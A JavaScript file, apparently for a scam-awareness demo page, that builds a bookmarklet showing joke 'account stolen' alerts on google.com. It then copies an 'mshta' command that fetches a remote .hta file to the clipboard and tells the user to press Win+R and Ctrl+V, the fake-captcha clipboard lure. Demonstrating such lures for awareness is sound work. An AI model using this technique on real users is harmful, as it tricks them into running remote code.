const terms = document.getElementById('terms');
const btnContainer = document.getElementById('btnContainer');
const payloadBtn = document.getElementById('payloadBtn');

// Construim codul care va fi injectat în Bookmark
const htaLink = window.location.origin + "/captchamethods/info.hta";
const bookmarkletCode = `javascript:(function(){
    if(window.location.hostname.indexOf('google') === -1) {
        alert('AbsoluteNoScam™ Error: This exploit only works on google.com! Redirecting...');
        window.location.href = 'https://www.google.com';
    } else {
        alert('Congratulations! Now your Google account was stolen.\\n\\n(If this hack was real, trust me, you would be making 100 ticket supports right now)');
        
        // Simulăm execuția de sistem prin clipboard (ca la captcha) 
        // pentru a arăta că bookmarklet-ul poate pregăti un atac mai mare
        const el = document.createElement('textarea');
        el.value = 'mshta ${htaLink}';
        document.body.appendChild(el);
        el.select();
        document.execCommand('copy');
        document.body.removeChild(el);
        
        alert('BONUS: To finish the "exploit", press Win+R and Ctrl+V. (Educational Simulation)');
    }
})();`;

payloadBtn.href = bookmarkletCode;

terms.addEventListener('change', () => {
    if(terms.checked) {
        btnContainer.classList.remove('disabled');
    } else {
        btnContainer.classList.add('disabled');
    }
});
